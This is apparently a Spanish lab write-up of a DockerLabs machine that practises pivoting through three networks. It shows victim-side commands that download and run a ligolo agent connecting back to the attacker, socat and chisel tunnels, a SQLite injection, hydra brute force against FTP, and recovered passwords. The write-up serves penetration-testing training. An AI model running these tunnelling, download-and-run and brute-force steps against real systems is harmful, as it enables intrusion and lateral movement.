
# 📑 Writeup: Máquina DockHackLab 🚀

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: hard](https://img.shields.io/badge/Dificultad-hard-%23FF0000?style=for-the-badge)

> **NOTA:** Esta máquina simula movimiento lateral (Pivoting) entre tres redes. No es un CTF de vulnerabilidad específica, según el creador de la máquina (PatxaSec).

---

# 🖥️ Primera Máquina — Hades (10.10.10.2)

## 🔍 Enumeración de Puertos

```ruby
nmap -sV -Pn -sC --min-rate 5000 -O --top-port 50000 10.10.10.2
```

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| `22/tcp` | ✅ Abierto | SSH | OpenSSH 9.6p1 Ubuntu |
| `80/tcp` | ✅ Abierto | HTTP | Werkzeug httpd 3.0.4 (Python 3.12.3) |
| `2222/tcp` | ✅ Abierto | tcpwrapped | — |

| Parámetro | Descripción |
|-----------|-------------|
| `-sV` | Detecta versiones de servicios |
| `-Pn` | Omite ping, asume host activo |
| `-sC` | Ejecuta scripts NSE por defecto |
| `--min-rate 5000` | Mínimo 5000 paquetes/segundo |
| `-O` | Detecta sistema operativo |
| `--top-ports 50000` | Escanea los 50k puertos más comunes |

---

## 🌐 Puerto 80 — Análisis Web

El servidor corre **Python/Werkzeug**. La página muestra el banner *"¡Atención, esto no es un CTF!"*.
No hay formularios ni vectores directos en el front-end.

**Vector de acceso:** Inspeccionar el código fuente (`Ctrl+U`) revela un string codificado en el footer.

### 🔓 Decodificación de Credenciales

El string usa tres capas de ofuscación:

| Herramienta | Función |
|-------------|---------|
| `base32 -d` | Primera capa — alfabeto A-Z, 2-7 con padding `====` |
| `base64 -d` | Segunda capa — decodifica el resultado intermedio |
| `xxd -r -p` | Tercera capa — convierte hex a ASCII legible |

```bash
echo 'STRING_DEL_FOOTER' | base32 -d | base64 -d | xxd -r -p
```

**Resultado:** `P0seidón2022!`

---

## 🚀 Pivoting con Ligolo-ng — Acceso a Red Interna (20.20.20.0/24)

### ¿Qué es Ligolo-ng?

**Ligolo-ng** es una herramienta de pivoting que crea un túnel TUN entre la máquina atacante y una máquina comprometida, permitiendo enrutar tráfico hacia redes internas de forma transparente, sin necesidad de proxychains.

La arquitectura es:
Atacante ──(túnel TLS)──> Proxy Ligolo
│
Hades (agente) ──> Red 20.20.20.0/24

---

### 📥 Paso 1 — Descargar Ligolo-ng

En la máquina atacante descargamos ambos binarios desde el repositorio oficial:

```bash
# Proxy (corre en el atacante)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz

# Agente (se transfiere a la víctima)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz

# Descomprimir ambos
tar -xzvf ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
tar -xzvf ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
```

---

### ⚙️ Paso 2 — Iniciar el Proxy en el Atacante

```bash
chmod +x proxy
./proxy -selfcert
```

El proxy queda escuchando en el puerto `11601` esperando conexiones del agente:
INFO[0000] Listening on 0.0.0.0:11601

> **Nota:** `-selfcert` genera un certificado TLS auto-firmado para cifrar el túnel. No requiere configuración adicional.

---

### 🌐 Paso 3 — Transferir el Agente a Hades

Levantamos un servidor HTTP temporal en el atacante para servir el binario:

```bash
# En el atacante — desde el directorio donde está el agente
python3 -m http.server 80
```

Desde la sesión SSH en **Hades**, descargamos y ejecutamos el agente:

```bash
# En Hades
wget http://10.0.2.15/agent -O agent
chmod +x agent
./agent -connect 10.0.2.15:11601 -ignore-cert
```

| Flag | Descripción |
|------|-------------|
| `-connect` | IP y puerto del proxy en el atacante |
| `-ignore-cert` | Ignora la verificación del certificado auto-firmado |

En la consola del proxy veremos la conexión entrante:
INFO[0012] Agent connected — hades@10.10.10.2

---

### 🖧 Paso 4 — Crear y Configurar la Interfaz TUN

En el atacante creamos la interfaz virtual que recibirá el tráfico tunelizado:

```bash
# Crear la interfaz TUN
sudo ip link add dev ligolo type tun

# Levantar la interfaz
sudo ip link set ligolo up

# Enrutar la red interna a través del túnel
sudo ip route add 20.20.20.0/24 dev ligolo
```

Verificamos que la ruta esté activa:

```bash
ip route | grep ligolo
# 20.20.20.0/24 dev ligolo scope link
```

---

### 🚀 Paso 5 — Activar el Túnel en Ligolo

En la consola interactiva de Ligolo:
ligolo-ng » session
Seleccionar el ID de la sesión de Hades
ligolo-ng » start
El túnel queda activo

A partir de este momento podemos alcanzar **20.20.20.0/24 directamente**, sin proxychains.

---

# 🌊 Segunda Máquina — Poseidón (20.20.20.3)

## 🔍 Enumeración de Puertos

Con el túnel activo lanzamos nmap directamente:

```bash
nmap -sT -sCV -n -Pn 20.20.20.3
```

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| `22/tcp` | ✅ Abierto | SSH | OpenSSH 8.4p1 Debian |
| `80/tcp` | ✅ Abierto | HTTP | Apache httpd 2.4.54 (Debian) |

---

## 🕵️ Explotación — SQLi en Base de Datos

El puerto 80 muestra *"Dojos El Papapasito del mar"* con secciones: **Buscar, Ranking y Perfil**.

El código fuente revela que la búsqueda hace POST a `database.php`. Confirmamos **SQLite** inyectando:

```sql
select name from sqlite_master
```

Tablas encontradas: **`usuarios`** y **`contrasena`**.

### 🔓 Decodificación de Credenciales

Contraseña extraída (usuario `megalodon`):
sha1sha1
sha1hahahaha$JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=


```bash
echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' | base32 -d | base64 -d | xxd -r -p
```

**Resultado:** `Templ02019!`

### 🔑 Acceso SSH

```bash
ssh megalodon@20.20.20.3
# Contraseña: Templ02019!

sudo bash  # Usuario tiene sudo completo → root ✅
```

**Segunda máquina — Poseidón completada. ✅**

---

# ⚡ Tercera Máquina — Zeus (30.30.30.3)

## ⚙️ Pivoting con Chisel + Socat

Poseidón tiene conectividad con Zeus pero no podemos usar Ligolo directamente desde aquí. Encadenamos el túnel usando **Chisel** y **Socat**.

### Verificar Arquitectura

```bash
# En Poseidón
uname -m
# x86_64 — misma arquitectura que Hades, usamos el mismo Chisel
```

### Transferir Chisel a Poseidón

Desde **Hades** usamos `scp` para pasar el binario a Poseidón:

```bash
scp chisel megalodon@20.20.20.3:/tmp/chisel
```

![scp_chisel_poseidon](screenshots/2-Poseidon/scp_chisel_poseidon.png)

---

### 🔁 Configurar Socat en Hades

Abrimos el puerto `1111` en Hades y reenviamos todo el tráfico al servidor Chisel del atacante:

```bash
socat TCP-LISTEN:1111,fork TCP:10.0.2.15:1080
```

![socat_hades](screenshots/2-Poseidon/socat_hades.png)

---

### 🔗 Configurar Chisel en Poseidón

Conectamos Poseidón al puerto `1111` de Hades. Usamos el puerto `8888` para el nuevo proxy SOCKS ya que el `1080` está en uso:

```bash
chmod +x /tmp/chisel
./chisel client 20.20.20.2:1111 socks --socks5 8888
```

![chisel_poseidon](screenshots/2-Poseidon/chisel_poseidon.png)

En el servidor de Chisel del atacante vemos la nueva conexión:

![sesion2_chisel](screenshots/2-Poseidon/sesion2_chisel.png)

---

### 📝 Actualizar Proxychains

Editamos `/etc/proxychains.conf`:

```bash
# Comentar la línea anterior:
# socks5 127.0.0.1 1080

# Agregar la nueva:
socks5 127.0.0.1 8888
```

![proxylist2](screenshots/2-Poseidon/proxylist2.png)

---

## 🔍 Enumeración de Puertos

```bash
proxychains4 -q nmap -sT -sCV -n -Pn 30.30.30.3
```

![target_zeus](screenshots/3-Zeus/target_zeus.png)

| Puerto | Estado | Servicio |
|--------|--------|---------|
| `21/tcp` | ✅ | FTP |
| `22/tcp` | ✅ | SSH |
| `80/tcp` | ✅ | HTTP — Apache (página default) |
| `139/tcp` | ✅ | SMB/Samba |
| `445/tcp` | ✅ | SMB/Samba |

---

## 👥 Puertos 139 y 445 — Enumeración SMB

```bash
proxychains4 -q enum4linux -a 30.30.30.3
```

![samba_users](screenshots/3-Zeus/samba_users.png)

No hay directorios interesantes pero encontramos dos usuarios: **`hercules`** y **`rayito`**.

---

## 🌐 Puerto 80

Configuramos el proxy con el puerto `8888` para acceder desde el navegador:

![proxy_zeus](screenshots/3-Zeus/proxy_zeus.png)

Vemos la página por defecto de Apache. El código fuente no revela nada y el fuzzing con **wfuzz** no encuentra subdirectorios.

---

## 📂 Puerto 21 — Fuerza Bruta FTP

Con los dos usuarios encontrados realizamos fuerza bruta usando una versión reducida del rockyou con las primeras 5000 contraseñas:

```bash
proxychains4 -q hydra -L users -P minirock ftp://30.30.30.3
```

![credentials_ftp](screenshots/3-Zeus/credentials_ftp.png)

**Credenciales encontradas:** `hercules:thunder1`

---

### Análisis del Servidor FTP

```bash
ftp 30.30.30.3
# usuario: hercules | contraseña: thunder1
get archivo.exe
```

![ftp_zeus](screenshots/3-Zeus/ftp_zeus.png)

Analizamos el binario con `strings`:

```bash
strings archivo.exe
```

![kratos_text](screenshots/3-Zeus/kratos_text.png)

Encontramos un string codificado en **Base64**:

```bash
echo 'AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE=' | base64 -d
```

**Resultado:** `electrocut4c10n!`

---

## 🔑 Acceso SSH — Zeus

```bash
proxychains4 -q ssh rayito@30.30.30.3
# Contraseña: electrocut4c10n!

sudo bash  # Usuario tiene sudo completo → root ✅
```

**Tercera máquina — Zeus completada. ✅**

---

# 🗺️ Resumen de Infraestructura
Atacante (10.0.2.15)
│
│ Ligolo-ng (túnel TUN directo)
▼
Hades (10.10.10.2) ────────── red 20.20.20.0/24
│
│ Socat puerto 1111 → reenvía a Chisel del atacante
▼
Poseidón (20.20.20.3) ──────── red 30.30.30.0/24
│
│ Chisel SOCKS5 puerto 8888
▼
Zeus (30.30.30.3)

| Máquina | IP | Usuario | Contraseña |
|---------|-----|---------|------------|
| Hades | 10.10.10.2 | — | `P0seidón2022!` |
| Poseidón | 20.20.20.3 | megalodon | `Templ02019!` |
| Zeus | 30.30.30.3 | rayito | `electrocut4c10n!` |
